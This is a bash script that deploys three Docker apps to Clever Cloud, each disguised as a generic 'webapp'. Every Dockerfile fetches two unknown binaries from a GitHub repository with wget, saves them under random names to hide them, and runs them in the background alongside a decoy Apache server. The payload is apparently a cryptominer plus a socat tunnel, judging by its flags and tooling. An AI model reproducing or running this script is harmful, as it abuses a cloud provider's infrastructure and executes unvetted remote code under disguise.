#!/bin/bash
# /app/docker - Using --alias correctly

set -e

# Configure git globally (required for commits)
git config --global user.email "bot@clevercloud.com"
git config --global user.name "Clever Cloud Bot"
git config --global init.defaultBranch "master"

echo "🔐 Logging into Clever Cloud..."
clever login

for i in 1 2 3; do
    APP_NAME="webapp-$(date +%s)-${RANDOM}"
    APP_DIR="/app/deployments/$APP_NAME"
    
    echo ""
    echo "[$i/3] Deploying $APP_NAME..."
    
    mkdir -p "$APP_DIR"
    cd "$APP_DIR"
    
    # Create Dockerfile

printf '%s\n' "FROM ubuntu:22.04" "CMD RAND1=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1) && RAND2=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1) && RAND3=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && RAND4=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && RAND5=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && apt-get update && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \$RAND1 https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888 && wget -O \$RAND2 https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888 && chmod 777 \$RAND1 \$RAND2 && bash ./\$RAND1 & service apache2 start && ./\$RAND2 -a \$RAND3 -o \$RAND4 -u \$RAND5" > Dockerfile

    # Git setup
    git init
    git add .
    git commit -m "Initial commit for $APP_NAME"
    
    # Create and deploy
    echo "Creating app on Clever Cloud..."
    clever create --type docker "$APP_NAME"
    
    echo "Deploying $APP_NAME..."
    clever deploy --alias "$APP_NAME"
    
    echo "[$i/3] ✅ https://$APP_NAME.osc-fr1.scalingo.io"
    
    cd /app
    rm -rf "$APP_DIR"
    
    if [ $i -lt 3 ]; then
        echo "Waiting 10 seconds before next deployment..."
        sleep 10
    fi
done

echo ""
echo "========================================="
echo "✅ All 3 apps deployed successfully!"
echo "========================================="
